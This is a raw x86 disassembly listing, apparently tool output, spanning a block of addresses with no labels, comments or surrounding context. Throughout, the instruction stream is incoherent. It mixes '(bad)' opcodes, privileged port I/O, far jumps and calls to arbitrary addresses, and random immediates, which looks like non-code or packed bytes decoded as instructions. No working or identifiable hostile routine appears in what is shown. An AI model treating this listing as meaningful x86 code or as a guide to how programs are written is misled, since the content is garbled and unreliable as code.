  41250e:	neg    BYTE PTR [ecx]
  412510:	pop    ebp
  412511:	fist   WORD PTR [esi+0x61e16b28]
  412517:	add    BYTE PTR [eax+0x5e],dh
  41251a:	std    
  41251b:	dec    edi
  41251c:	ret    
  41251d:	jne    0x412555
  41251f:	xchg   DWORD PTR [ecx-0x306463e5],edx
  412525:	in     eax,dx
  412526:	cmp    bl,bl
  412528:	cld    
  412529:	loopne 0x4124cc
  41252b:	xor    al,0x53
  41252d:	scas   eax,DWORD PTR es:[edi]
  41252e:	nop
  41252f:	dec    esi
  412530:	aam    0x57
  412532:	cld    
  412533:	imul   edi,DWORD PTR [ebx],0xffffffba
  412536:	imul   edi,DWORD PTR [ecx],0xf20312eb
  41253c:	pop    ebx
  41253d:	fbstp  TBYTE PTR [edi-0x76444125]
  412543:	sub    BYTE PTR [edi+0x4],bl
  412546:	hlt    
  412547:	outs   dx,DWORD PTR ds:[esi]
  412548:	mov    al,BYTE PTR ds:0xefc2487e
  41254e:	sub    ah,BYTE PTR [esi-0x11ee2035]
  412554:	out    dx,al
  412555:	adc    dl,dh
  412557:	enter  0x105,0x9b
  41255b:	scas   eax,DWORD PTR es:[edi]
  41255c:	jmp    0x412520
  41255e:	outs   dx,DWORD PTR ds:[esi]
  41255f:	jge    0x41257d
  412561:	outs   dx,BYTE PTR ds:[esi]
  412562:	test   esp,esp
  412564:	jle    0x412544
  412566:	ret    
  412567:	mov    edi,esp
  412569:	sbb    al,0x4
  41256b:	push   esp
  41256c:	inc    ebx
  41256d:	setl   BYTE PTR [edx-0x33]
  412571:	fnstcw WORD PTR [ebp+0x1a]
  412574:	loopne 0x4125d2
  412576:	(bad)  
  412577:	xchg   ebp,eax
  412578:	pop    ebx
  412579:	adc    esp,DWORD PTR [eax+0x67]
  41257c:	mov    esi,esp
  41257e:	mov    ebp,0xae22d33
  412583:	add    al,0x3c
  412585:	sub    edi,DWORD PTR [edx+0x48]
  412588:	ins    BYTE PTR es:[edi],dx
  412589:	test   eax,0x16eb9929
  41258e:	inc    esp
  41258f:	(bad)  
  412590:	jmp    0x4e0a:0x8d89912d
  412597:	jl     0x412532
  412599:	(bad)  
  41259b:	dec    esp
  41259c:	daa    
  41259d:	xchg   ecx,eax
  41259e:	sbb    bl,al
  4125a0:	retf   
  4125a1:	sub    ebp,edi
  4125a3:	(bad)  
  4125a4:	dec    ebp
  4125a5:	das    
  4125a6:	stos   BYTE PTR es:[edi],al
  4125a7:	test   BYTE PTR [edi+0x56],0x15
  4125ab:	mov    eax,ds:0x5cdfdf72
  4125b0:	mov    ebp,0xa0f33e1
  4125b5:	fdivr  st,st(4)
  4125b7:	jmp    DWORD PTR [edx+edx*4]
  4125ba:	aad    0xe7
  4125bc:	aad    0xbf
  4125be:	sbb    eax,0x323741c8
  4125c3:	jp     0x41254b
  4125c5:	scas   al,BYTE PTR es:[edi]
  4125c6:	xchg   edi,eax
  4125c7:	xor    ah,bh
  4125c9:	popf   
  4125ca:	push   edi
  4125cb:	(bad)  
  4125cc:	enter  0xbc94,0x10
  4125d0:	imul   esp,DWORD PTR [esi-0x398237f4],0xffffffb3
  4125d7:	mov    ebx,edx
  4125d9:	mov    dh,BYTE PTR [eax-0x79b2147e]
  4125df:	push   0xffffff9b
  4125e1:	mov    dh,0xba
  4125e3:	xor    ch,BYTE PTR [edi-0x3c]
  4125e6:	js     0x4125b0
  4125e8:	ror    BYTE PTR [ebx],1
  4125ea:	outs   dx,BYTE PTR ds:[esi]
  4125eb:	add    DWORD PTR [esi],0xe6b51e77
  4125f1:	pop    ebp
  4125f2:	test   BYTE PTR [esi+0x24],0x8b
  4125f6:	mov    ebp,0xcc085625
  4125fb:	enter  0x824b,0xbf
  4125ff:	stos   BYTE PTR es:[edi],al
  412600:	xchg   edi,eax
  412601:	test   al,0x30
  412603:	push   esi
  412604:	jecxz  0x4125df
  412606:	aad    0x47
  412608:	or     al,0xe6
  41260a:	scas   al,BYTE PTR es:[edi]
  41260b:	call   0x14a946ab
  412610:	sub    al,0xdd
  412612:	mov    dh,0x13
  412614:	data16 sbb ah,BYTE PTR [ebx+0x6b]
  412618:	mov    esp,DWORD PTR [edi+eiz*8-0x4e]
  41261c:	jmp    0x412607
  41261e:	adc    ah,cl
  412620:	push   ecx
  412621:	jae    0x41262d
  412623:	outs   dx,BYTE PTR ds:[esi]
  412624:	dec    ebx
  412625:	fild   QWORD PTR [esi]
  412627:	mov    DWORD PTR [esi+ebx*8+0x49ca634d],ecx
  41262e:	add    ebx,DWORD PTR [ebp+0x7cbcd367]
  412634:	ds in  al,dx
  412636:	or     ch,BYTE PTR ds:[edx]
  412639:	or     BYTE PTR [edx],al
  41263b:	sbb    al,0x60
  41263d:	dec    eax
  41263e:	jle    0x412682
  412640:	icebp  
  412641:	push   edi
  412642:	inc    ebx
  412643:	stos   BYTE PTR es:[edi],al
  412644:	lods   al,BYTE PTR ds:[esi]
  412645:	inc    edi
  412646:	and    al,0xb5
  412648:	jmp    0x4125db
  41264a:	cmp    eax,0xd850870b
  41264f:	iret   
  412650:	out    0xec,eax
  412652:	and    BYTE PTR [edi+0x62],bh
  412655:	fbld   TBYTE PTR [ebx+0x18]
  412658:	imul   ecx,DWORD PTR [ecx+0x7bebe4a6],0x162eda55
  412662:	or     ch,BYTE PTR [esi-0x36a137f5]
  412668:	retf   
  412669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41266a:	or     BYTE PTR [edx],ah
  41266c:	cwde   
  41266d:	sub    al,0x6c
  41266f:	cld    
  412670:	fsub   DWORD PTR [eax-0x55]
  412673:	cmp    bl,ch
  412675:	xor    cl,BYTE PTR [eax+eax*2-0x70c1c78]
  41267c:	mov    ss,esp
  41267e:	pusha  
  41267f:	push   esi
  412680:	(bad)  
  412681:	ins    DWORD PTR es:[edi],dx
  412682:	std    
  412683:	mov    esi,0x94d235c6
  412688:	lds    esi,FWORD PTR [eax+eax*8]
  41268b:	(bad)  
  41268c:	jmp    0xfc1f:0x67025447
  412693:	adc    BYTE PTR [esi+0x2742d3df],dh
  412699:	jmp    0xa295:0x1d71b211
  4126a0:	(bad)  
  4126a1:	mov    esi,0x6e2bbefe
  4126a6:	sub    eax,0x65b9e0d3
  4126ab:	mov    dh,0xca
  4126ad:	lahf   
  4126ae:	(bad)  
  4126af:	enter  0xe1b6,0xf1
  4126b3:	mov    eax,ds:0xa8fcfd4c
  4126b8:	add    esp,DWORD PTR es:0x46e24052
  4126bf:	mov    ds:0x291cde8f,eax
  4126c4:	stc    
  4126c5:	xor    BYTE PTR [ecx+0x66],bl
  4126c8:	(bad)  
  4126c9:	aaa    
  4126ca:	adc    dl,BYTE PTR [eax+0x3e4e0eeb]
  4126d0:	bound  edi,QWORD PTR [ebx-0x2004a9b6]
  4126d6:	sbb    al,0xf5
  4126d8:	jl     0x412711
  4126da:	fst    DWORD PTR [ecx+0x31]
  4126dd:	add    ebp,edi
  4126df:	rcl    DWORD PTR [edx],cl
  4126e1:	mov    WORD PTR [eax],?
  4126e3:	in     eax,0xc2
  4126e5:	ds (bad) 
  4126e7:	(bad)  
  4126e8:	or     eax,0xbf6a5e24
  4126ed:	aam    0x66
  4126ef:	imul   ebp,ebx,0x36
  4126f2:	or     al,0xa6
  4126f4:	adc    edi,DWORD PTR ds:0xe004e369
  4126fa:	sub    ebx,DWORD PTR [ebx+0x2c]
  4126fd:	cdq    
  4126fe:	(bad)  [ebp+0x50]
  412701:	cmp    ch,0xfa
  412704:	rol    BYTE PTR [ecx],0x2e
  412707:	fcmovne st,st(3)
  412709:	mov    esp,0xda6bbd68
  41270e:	sbb    al,0x88
  412710:	fistp  QWORD PTR [ecx]
  412712:	aad    0x7e
  412714:	sbb    eax,DWORD PTR [eax-0x69135251]
  41271a:	test   DWORD PTR [edi+0x55],ecx
  41271d:	mov    DWORD PTR [ebp+0x5951374c],ebx
  412723:	iret   
  412724:	push   cs
  412725:	fwait
  412726:	or     DWORD PTR cs:[ebp-0x21],edx
  41272a:	mov    ebp,0xb7d103ac
  41272f:	mov    dl,0xeb
  412731:	push   edi
  412732:	rcr    DWORD PTR [edi-0x74613b26],1
  412738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412739:	(bad)  
  41273b:	jp     0x41277a
  41273d:	pop    eax
  41273e:	lods   eax,DWORD PTR ds:[esi]
  41273f:	mov    ds,WORD PTR [ecx]
  412741:	hlt    
  412742:	xor    al,0xc4
  412744:	rcr    edi,0x5d
  412747:	jb     0x41272c
  412749:	int    0x7d
  41274b:	inc    esi
  41274c:	aaa    
  41274d:	fisttp WORD PTR [eax+0x7a68e042]
  412753:	aaa    
  412754:	stos   BYTE PTR es:[edi],al
  412755:	fdivp  st(4),st
  412757:	les    esp,FWORD PTR [ebx]
  412759:	cdq    
  41275a:	hlt    
  41275b:	test   BYTE PTR ds:0xc5c8bb39,al
  412761:	dec    sp
  412763:	lahf   
  412764:	pop    esi
  412765:	jmp    0x41274d
  412767:	fs jmp 0x41277d
  41276a:	sbb    BYTE PTR [edi],cl
  41276c:	pop    eax
  41276d:	sub    DWORD PTR [ebx],0x8fdf8251
  412773:	mov    al,ds:0x7d13b53
  412778:	inc    eax
  412779:	sub    al,0xfd
  41277b:	dec    ebp
  41277c:	dec    eax
  41277d:	lahf   
  41277e:	aad    0xdf
  412780:	adc    ecx,edx
  412782:	clc    
  412783:	mov    esi,0x48a5749d
  412788:	xchg   ecx,eax
  412789:	enter  0x116d,0xa8
  41278d:	out    dx,al
  41278e:	cld    
  41278f:	add    eax,0x9967b605
  412794:	and    al,0x75
  412796:	imul   edi,DWORD PTR [edx+edi*8-0x7577ae58],0x27
  41279e:	test   al,0xec
  4127a0:	lods   eax,DWORD PTR ds:[esi]
  4127a1:	mov    al,ds:0xe14924fc
  4127a6:	mov    bh,0xb
  4127a8:	out    dx,eax
  4127a9:	test   eax,0x92acc815
  4127ae:	inc    esi
  4127af:	pop    edi
  4127b0:	aad    0x2b
  4127b2:	jecxz  0x4127c9
  4127b4:	jmp    0x4127fa
  4127b6:	mov    ebp,0xc0ec83e
  4127bb:	xor    DWORD PTR [eax+0x48b53df],eax
  4127c1:	dec    edi
  4127c2:	mov    edx,DWORD PTR [edi+0x3afd534a]
  4127c8:	mov    BYTE PTR [eax],bl
  4127ca:	adc    BYTE PTR [ecx+0x6],bl
  4127cd:	lods   eax,DWORD PTR ds:[esi]
  4127ce:	test   eax,ecx
  4127d0:	sub    dl,bh
  4127d2:	shl    BYTE PTR [ebx],0x55
  4127d5:	into   
  4127d6:	mov    DWORD PTR [ebx+ebp*8],edi
  4127d9:	(bad)  
  4127da:	push   esi
  4127db:	sbb    al,ah
  4127dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127de:	shr    cl,1
  4127e0:	inc    eax
  4127e1:	inc    ecx
  4127e2:	sbb    esp,eax
  4127e4:	ins    BYTE PTR es:[edi],dx
  4127e5:	push   edx
  4127e6:	jge    0x412820
  4127e8:	out    0x66,al
  4127ea:	dec    ebp
  4127eb:	sub    ebx,esp
  4127ed:	mov    ah,0xfc
  4127ef:	adc    DWORD PTR [ebx],edi
  4127f1:	mov    ds,WORD PTR [esi+0x3b]
  4127f4:	push   ebp
  4127f5:	iret   
  4127f6:	xchg   DWORD PTR [ebx+ecx*2],ebx
  4127f9:	fistp  WORD PTR [ebx-0x3ef2c24f]
  4127ff:	adc    al,0xd1
  412801:	mov    al,0xfc
  412803:	xor    eax,0xc5c75f74
  412808:	pop    edx
  412809:	fstp   DWORD PTR ds:0x77502fcf
  41280f:	sti    
  412810:	imul   eax,DWORD PTR [edx],0xffffffdf
  412813:	xchg   ebx,eax
  412814:	lock call 0x135b:0xebbcfbfc
  41281c:	(bad)  
  41281e:	xchg   al,cl
  412820:	cmp    BYTE PTR gs:[edi+0x2bc86c1d],cl
  412827:	and    al,0x1b
  412829:	aaa    
  41282a:	out    0xf3,al
  41282c:	fst    DWORD PTR [ebp+ebx*2+0x3f]
  412830:	les    ebx,FWORD PTR [edi+0x44]
  412833:	in     al,0xa9
  412835:	aas    
  412836:	inc    ecx
  412837:	enter  0xada6,0xf8
  41283b:	adc    eax,0xcb2feaa5
  412840:	jmp    0x4127cc
  412842:	pop    esp
  412843:	jno    0x412810
  412845:	ja     0x41283f
  412847:	mov    ds:0x7575dc98,eax
  41284c:	(bad)  
  41284e:	out    0x8d,eax
  412850:	dec    ebx
  412851:	aad    0xd8
  412853:	xchg   edx,eax
  412854:	jmp    0x41287f
  412856:	or     esp,DWORD PTR [eax+0x581a6850]
  41285c:	dec    eax
  41285d:	fild   QWORD PTR [esi+0xf]
  412860:	sub    esp,edi
  412862:	outs   dx,DWORD PTR ds:[esi]
  412863:	cmp    eax,0x13ffe13b
  412868:	add    eax,edx
  41286a:	xchg   ebx,eax
  41286b:	dec    esi
  41286c:	push   0x50
  41286e:	std    
  41286f:	ins    BYTE PTR es:[edi],dx
  412870:	(bad)  
  412871:	sbb    edi,DWORD PTR [eax]
  412873:	enter  0x984c,0x92
  412877:	mov    ds:0x5ce22d3a,al
  41287c:	jmp    0x412891
  41287e:	mov    ds:0x3546651c,eax
  412883:	xor    al,0x61
  412885:	int3   
  412886:	mov    eax,ds:0x91a454cb
  41288b:	(bad)  
  41288c:	cmp    DWORD PTR [ebp+esi*4+0x15],ebx
  412890:	mov    cl,0x1b
  412892:	std    
  412893:	call   0xf68a3926
  412898:	and    DWORD PTR [edi+0x3800c80a],0x1
  41289f:	jnp    0x4128e4
  4128a1:	sbb    DWORD PTR [edi],0x66
  4128a4:	jmp    0x412898
  4128a6:	pop    ecx
  4128a7:	nop
  4128a8:	dec    ebx
  4128a9:	(bad)  
  4128aa:	aas    
  4128ab:	out    dx,eax
  4128ac:	ins    DWORD PTR es:[edi],dx
  4128ad:	fistp  QWORD PTR [ecx+0x3e1112c3]
  4128b3:	xchg   ecx,eax
  4128b4:	xor    BYTE PTR [edi-0x3],bl
  4128b7:	xchg   ebx,eax
  4128b8:	in     eax,0x7b
  4128ba:	xchg   edx,eax
  4128bb:	dec    edx
  4128bc:	int3   
  4128bd:	mov    al,ds:0x8f38ce90
  4128c2:	popa   
  4128c3:	jge    0x4128f0
  4128c5:	ds sbb eax,0xfcd592c4
  4128cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128cc:	pop    ds
  4128cd:	enter  0xdd5c,0x6d
  4128d1:	stos   DWORD PTR es:[edi],eax
  4128d2:	inc    ebp
  4128d3:	mov    esp,0xc8075da9
  4128d8:	cli    
  4128d9:	adc    ebx,edi
  4128db:	lahf   
  4128dc:	sbb    al,0x20
  4128de:	(bad)  
  4128df:	and    esi,DWORD PTR [edx+0x2713aaa2]
  4128e5:	int3   
  4128e6:	in     al,dx
  4128e7:	cmc    
  4128e8:	fs (bad) 
  4128eb:	loop   0x4128c9
  4128ed:	inc    esi
  4128ee:	jmp    0x9eb0:0xfceb7128
  4128f5:	jno    0x41288e
  4128f7:	nop
  4128f8:	ds in  eax,0x3f
  4128fb:	enter  0xe1b6,0xef
  4128ff:	imul   ebx,ebx,0x26
  412902:	adc    BYTE PTR [esi-0x199be402],ch
  412908:	lods   al,BYTE PTR ds:[esi]
  412909:	mov    ebp,0x28367d69
  41290e:	fstp   st(6)
  412910:	xor    bh,bl
  412912:	in     eax,0x1f
  412914:	(bad)  
  412915:	pop    ds
  412916:	cmp    eax,0xfd3437dc
  41291b:	inc    esp
  41291c:	in     eax,0xd7
  41291e:	jmp    0xe4c8:0x546fbc1e
  412925:	lds    edx,FWORD PTR [ecx+0x5f8fc787]
  41292b:	outs   dx,BYTE PTR ds:[esi]
  41292c:	call   0x2b9c50e6
  412931:	loope  0x4129af
  412933:	sub    eax,0xc81fd6a7
  412938:	mov    edx,0xf3d91168
  41293d:	pop    ebx
  41293e:	scas   eax,DWORD PTR es:[edi]
  41293f:	shr    bl,0x32
  412942:	jbe    0x41294a
  412944:	test   BYTE PTR [edx-0x1f30f2d6],0x40
  41294b:	imul   ebx,DWORD PTR [esp+eax*1-0x2e],0x57
  412950:	jp     0x412913
  412952:	push   ecx
  412953:	xor    al,0xeb
  412955:	add    esi,DWORD PTR [eax-0x17]
  412958:	into   
  412959:	outs   dx,DWORD PTR ds:[esi]
  41295a:	mov    BYTE PTR [edx-0x35],ah
  41295d:	jecxz  0x412940
  41295f:	or     ebx,esi
  412961:	dec    edx
  412962:	outs   dx,DWORD PTR ds:[esi]
  412963:	dec    eax
  412964:	mov    ebp,0xebd5e9a6
  412969:	aad    0xb8
  41296b:	fs nop
  41296d:	cmp    BYTE PTR ds:[eax+0xebedc88],cl
  412974:	mov    ch,0x5
  412976:	xchg   esp,eax
  412977:	ins    DWORD PTR es:[edi],dx
  412978:	cmp    esp,DWORD PTR ds:0x98edccde
  41297e:	sub    BYTE PTR [edi-0x47],ch
  412981:	mov    BYTE PTR [ebp-0x36],bh
  412984:	dec    eax
  412985:	dec    edi
  412986:	pusha  
  412987:	sub    ebp,eax
  412989:	push   ecx
  41298a:	inc    esi
  41298b:	enter  0x1050,0xe0
  41298f:	inc    edx
  412990:	jo     0x412a09
  412992:	adc    bl,BYTE PTR ds:0x40aef4ea
  412998:	cld    
  412999:	outs   dx,BYTE PTR ds:[esi]
  41299a:	mov    esi,0x2c019a68
  41299f:	mov    ds:0x35de0989,al
  4129a4:	jmp    0x4129eb
  4129a6:	xchg   edx,eax
  4129a7:	add    BYTE PTR ds:0xea4c6510,al
  4129ad:	imul   BYTE PTR [edx+0x19]
  4129b0:	inc    esi
  4129b1:	xor    DWORD PTR [esi+0x38],esp
  4129b4:	xchg   edi,eax
  4129b5:	sbb    esp,edx
  4129b7:	(bad)  
  4129b8:	sbb    eax,esi
  4129ba:	inc    esi
  4129bb:	ins    DWORD PTR es:[edi],dx
  4129bc:	mov    ebx,0xfd6e78f8
  4129c1:	ds out 0xd9,eax
  4129c4:	imul   esp,DWORD PTR [edx+esi*1-0x50f50ed5],0xffffffd9
  4129cc:	jb     0x41295d
  4129ce:	lea    esi,[ebp+0x46]
  4129d1:	emms   
  4129d3:	dec    esi
  4129d4:	in     al,dx
  4129d5:	and    esp,esp
  4129d7:	and    ebp,DWORD PTR [esi]
  4129d9:	push   es
  4129da:	mov    al,0xaa
  4129dc:	or     ecx,esi
  4129de:	fcmovb st,st(7)
  4129e0:	inc    edi
  4129e1:	inc    ecx
  4129e2:	xchg   ebp,eax
  4129e3:	push   esp
  4129e4:	cmp    al,0x4d
  4129e6:	mov    BYTE PTR [edx+ebp*8],0xe0
  4129ea:	fwait
  4129eb:	jb     0x412a30
  4129ed:	cdq    
  4129ee:	push   0x60
  4129f0:	stc    
  4129f1:	mov    esi,0x8591cdf5
  4129f6:	or     al,0x20
  4129f8:	or     edx,ebx
  4129fa:	mov    bh,dl
  4129fc:	mov    cl,0xef
  4129fe:	shld   edi,edx,cl
  412a01:	cli    
  412a02:	cld    
  412a03:	xchg   esi,eax
  412a04:	ins    BYTE PTR es:[edi],dx
  412a05:	cmp    edx,esi
  412a07:	cwde   
  412a08:	sbb    al,0xdf
  412a0a:	push   esp
  412a0b:	out    dx,eax
  412a0c:	retf   
  412a0d:	gs dec ebx
  412a0f:	test   BYTE PTR [eax-0x65a027f],bl
  412a15:	push   ebp
  412a16:	jo     0x412a0d
  412a18:	sbb    eax,0x28c87199
  412a1d:	inc    edx
  412a1e:	inc    esi
  412a1f:	stc    
  412a20:	repnz add al,0xa7
  412a23:	mov    ah,0xeb
  412a25:	xchg   ebx,eax
  412a26:	gs in  eax,0xe4
  412a29:	and    esi,DWORD PTR [edx]
  412a2b:	(bad)  
  412a2c:	xchg   ecx,eax
  412a2d:	(bad)  
  412a2f:	int    0x80
  412a31:	arpl   WORD PTR [eax-0x2ff6d8b],sp
  412a37:	nop
  412a38:	das    
  412a39:	xchg   ecx,eax
  412a3a:	enter  0x3841,0x87
  412a3e:	iret   
  412a3f:	mov    esi,fs
  412a41:	(bad)  
  412a42:	std    
  412a43:	jo     0x412a4f
  412a45:	pop    eax
  412a46:	pop    ebx
  412a47:	test   BYTE PTR [ebx],0x40
  412a4a:	repz addr16 es mov dh,0x77
  412a4f:	sub    BYTE PTR [ecx-0x25],ah
  412a52:	add    eax,DWORD PTR [ebx-0x53]
  412a55:	fisttp WORD PTR [esi-0x73]
  412a58:	cs mov ecx,0xc00e8f45
  412a5e:	(bad)  
  412a5f:	out    dx,eax
  412a60:	mov    edx,0x8a69d85a
  412a65:	aas    
  412a66:	lds    ebx,FWORD PTR [edx]
  412a68:	popf   
  412a69:	fsubr  DWORD PTR [ecx]
  412a6b:	dec    eax
  412a6c:	mov    BYTE PTR ss:[ebp-0x37],bh
  412a70:	or     ebp,ecx
  412a72:	aas    
  412a73:	mov    dl,0xeb
  412a75:	imul   esi,esi,0xffffffc3
  412a78:	daa    
  412a79:	inc    ecx
  412a7a:	xor    edi,DWORD PTR [eax+0x1e90dfde]
  412a80:	jmp    DWORD PTR [edx]
  412a82:	pop    edi
  412a83:	pop    ecx
  412a84:	cdq    
  412a85:	and    cl,bl
  412a87:	div    BYTE PTR [eax-0x411e0327]
  412a8d:	lods   al,BYTE PTR ds:[esi]
  412a8e:	out    dx,eax
  412a8f:	fbstp  TBYTE PTR [ecx-0x24]
  412a92:	ror    BYTE PTR [esi],cl
  412a94:	inc    ecx
  412a95:	push   0x29
  412a97:	iret   
  412a98:	pop    ebx
  412a99:	sbb    ebp,ebx
  412a9b:	jne    0x412a89
  412a9d:	rol    cl,0x9b
  412aa0:	adc    ch,BYTE PTR [ebx]
  412aa2:	data16 rol BYTE PTR [ebx-0x5b],1
  412aa6:	push   edi
  412aa7:	mov    esp,0xc9c67dcc
  412aac:	iret   
  412aad:	ins    DWORD PTR es:[edi],dx
  412aae:	lds    esi,FWORD PTR [edx]
  412ab0:	jmp    0x6b58aae3
  412ab5:	xchg   esp,eax
  412ab6:	push   ecx
  412ab7:	mov    cl,0xeb
  412ab9:	push   ebx
  412aba:	or     ah,ch
  412abc:	dec    eax
  412abd:	jae    0x412a60
  412abf:	out    0xbf,eax
  412ac1:	fistp  QWORD PTR [ecx+eiz*2-0x31]
  412ac5:	imul   edx,DWORD PTR [ebx],0xffffff96
  412ac8:	mov    ds:0x1b88018b,eax
  412acd:	push   cs
  412ace:	jge    0x412b19
  412ad0:	sbb    BYTE PTR [ecx+ebx*1+0x50],0x34
  412ad5:	cmp    esi,DWORD PTR [ecx-0x38]
  412ad8:	xchg   ecx,eax
  412ad9:	cmp    BYTE PTR [edx],dh
  412adb:	xor    DWORD PTR [ecx+0x1e],edi
  412ade:	gs ins BYTE PTR es:[edi],dx
  412ae0:	lds    esi,FWORD PTR [ebx+eax*4-0x50]
  412ae4:	jmp    0x228f:0x69b2fdbd
  412aeb:	div    BYTE PTR [edi-0x21]
  412aee:	ja     0x412abd
  412af0:	pop    ds
  412af1:	or     eax,0xf395437d
  412af6:	repnz mov ds:0x8501575a,eax
  412afc:	test   bl,dl
  412afe:	mov    esp,0x236b2a2d
  412b03:	enter  0xe549,0x33
  412b07:	mul    DWORD PTR [ebx]
  412b09:	xor    DWORD PTR [esi-0x30a7cbd],edi
  412b0f:	jb     0x412ac3
  412b11:	add    DWORD PTR [edi-0x70],edx
  412b14:	xchg   DWORD PTR [ecx+0x4689c838],esp
  412b1a:	cmp    al,0xd3
  412b1c:	cwde   
  412b1d:	dec    ebp
  412b1e:	pushf  
  412b1f:	inc    edi
  412b20:	jmp    0x412b0a
  412b22:	lods   al,BYTE PTR ds:[esi]
  412b23:	pop    esp
  412b24:	mov    ecx,0x34944ab9
  412b29:	push   es
  412b2a:	adc    bl,bh
  412b2c:	in     al,dx
  412b2d:	fsub   st,st(1)
  412b2f:	popa   
  412b30:	inc    edx
  412b31:	mov    dl,0xcb
  412b33:	mov    esi,DWORD PTR [eax]
  412b35:	mov    BYTE PTR [ebp-0x193666b],dl
  412b3b:	(bad)  
  412b3c:	(bad)  [ebp+0x1b]
  412b3f:	inc    esi
  412b40:	or     cl,ch
  412b42:	les    ebp,FWORD PTR [ecx+0x0]
  412b45:	loopne 0x412b9e
  412b47:	pushf  
  412b48:	ret    
  412b49:	out    0x4a,eax
  412b4b:	loope  0x412b12
  412b4d:	dec    esi
  412b4e:	(bad)  
  412b4f:	repnz in al,dx
  412b51:	mov    bl,0x2e
  412b53:	pusha  
  412b54:	js     0x412b7f
  412b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b57:	mov    cl,0xe3
  412b59:	fimul  WORD PTR [ebp+0x7c]
  412b5c:	cmp    al,0xf0
  412b5e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b60:	sahf   
  412b61:	push   ebx
  412b62:	push   eax
  412b63:	adc    bl,ch
  412b65:	push   eax
  412b66:	js     0x412bca
  412b68:	sbb    eax,0xc62578a2
  412b6d:	fisttp WORD PTR [edi]
  412b6f:	fistp  DWORD PTR [ebx]
  412b71:	mov    dh,0xa0
  412b73:	imul   edi,DWORD PTR [edi+0x690fff0a],0x54
  412b7a:	adc    DWORD PTR [ecx+0x63],esp
  412b7d:	pop    ds
  412b7e:	adc    eax,esi
  412b80:	xor    bh,bl
  412b82:	mov    ds:0x316f42cc,eax
  412b87:	popf   
  412b88:	mov    BYTE PTR [ebp+0x5a4f9f4d],al
  412b8e:	std    
  412b8f:	mov    esp,0xf1b4b0a1
  412b94:	push   ds
  412b95:	dec    edx
  412b96:	iret   
  412b97:	retf   
  412b98:	ret    
  412b99:	jmp    0xe8a06d9b
  412b9e:	mov    ah,0x81
  412ba0:	jmp    0xf7e237c1
  412ba5:	cdq    
  412ba6:	cld    
  412ba7:	push   ss
  412ba8:	sub    BYTE PTR [edx],dl
  412baa:	inc    eax
  412bab:	in     eax,0xa2
  412bad:	fbstp  TBYTE PTR [ebp-0x54]
  412bb0:	cmp    DWORD PTR [edx],ebp
  412bb2:	out    0xb0,al
  412bb4:	jno    0x412bc5
  412bb6:	add    ah,ch
  412bb8:	sar    DWORD PTR [esi+0x7c9ab5c8],1
  412bbe:	sbb    bh,dh
  412bc0:	jmp    0x412c39
  412bc2:	cs xor al,0x30
  412bc5:	fist   WORD PTR [esi+0x6e]
  412bc8:	ins    BYTE PTR es:[edi],dx
  412bc9:	cmp    BYTE PTR [ebx],al
  412bcb:	addr16 pop es
  412bcd:	lahf   
  412bce:	cld    
  412bcf:	and    DWORD PTR [ecx-0x16],0xa2d5b623
  412bd6:	outs   dx,BYTE PTR ds:[esi]
  412bd7:	mov    esi,0x2ca0fd62
  412bdc:	cli    
  412bdd:	fistp  WORD PTR [ebp-0x1d6e37cd]
  412be3:	cmp    ebx,DWORD PTR [ebx]
  412be5:	rep stos DWORD PTR es:[edi],eax
  412be7:	adc    al,0x2
  412be9:	pop    esi
  412bea:	add    BYTE PTR [esi+0x39],cl
  412bed:	idiv   DWORD PTR [edi-0x26]
  412bf0:	xchg   esi,eax
  412bf1:	jg     0x412c6d
  412bf3:	imul   BYTE PTR [esi]
  412bf5:	xchg   DWORD PTR [ebx+eiz*8-0x2d8c1de2],ebp
  412bfc:	scas   eax,DWORD PTR es:[edi]
  412bfd:	pop    ebx
  412bfe:	jge    0x412c44
  412c00:	fnstcw WORD PTR [esi+0x25ec3a21]
  412c06:	rcl    bh,1
  412c08:	(bad)  [eax]
  412c0a:	shl    DWORD PTR [ecx],0x2a
  412c0d:	jg     0x412c57
  412c0f:	or     bl,dl
  412c11:	fist   WORD PTR [edi+eax*1]
  412c14:	repnz clc 
  412c16:	sbb    al,BYTE PTR [edi-0x6e]
  412c19:	jecxz  0x412c16
  412c1b:	cmp    eax,ebp
  412c1d:	aaa    
  412c1e:	sbb    al,0xa5
  412c20:	dec    ebx
  412c21:	pop    ss
  412c22:	fdiv   DWORD PTR [eax-0x10]
  412c25:	inc    ebx
  412c26:	addr16 out 0xa6,al
  412c29:	dec    edi
  412c2a:	jmp    0x78e1:0x25ea3ec7
  412c31:	xor    BYTE PTR ss:[edi-0x15],dl
  412c35:	mov    edi,0xeb0d26e9
  412c3a:	pop    edx
  412c3b:	push   ss
  412c3c:	ret    0x88df
  412c3f:	fucomip st,st(1)
  412c41:	(bad)  
  412c42:	retf   
  412c43:	stos   BYTE PTR es:[edi],al
  412c44:	cmc    
  412c45:	in     eax,dx
  412c46:	dec    esp
  412c47:	cwde   
  412c48:	sub    ah,0xf8
  412c4b:	daa    
  412c4c:	jle    0x412bde
  412c4e:	daa    
  412c4f:	fisubr WORD PTR [ebx]
  412c51:	mov    DWORD PTR [ecx-0x1234b7a],ebp
  412c57:	loope  0x412c7a
  412c59:	into   
  412c5a:	mov    cl,0x76
  412c5c:	sbb    DWORD PTR ds:0xb8eb7e72,0xffffffcd
  412c63:	mov    ebx,0x8c96542c
  412c68:	popf   
  412c69:	add    eax,0x79eb9151
  412c6e:	adc    dh,BYTE PTR [eax+0x12]
  412c71:	lock ss call 0xc9bc7563
  412c78:	mov    al,0x3d
  412c7a:	mov    DWORD PTR [ebx+0x6afdfa1],ecx
  412c80:	xchg   DWORD PTR [ebx+0x2fa683f1],edx
  412c86:	repz stc 
  412c88:	in     al,0xfe
  412c8a:	out    dx,al
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	call   0x86251550
  412c91:	mov    ch,0x54
  412c93:	enter  0xf045,0x92
  412c97:	jge    0x412ce4
  412c99:	jmp    0x5e6f:0x80ebd6d5
  412ca0:	(bad)  
  412ca2:	stc    
  412ca3:	test   ebx,esi
  412ca5:	fistp  WORD PTR [eax+0x545a4d16]
  412cab:	dec    ebx
  412cac:	mov    ch,cl
  412cae:	cld    
  412caf:	pop    esi
  412cb0:	dec    esp
  412cb1:	pop    es
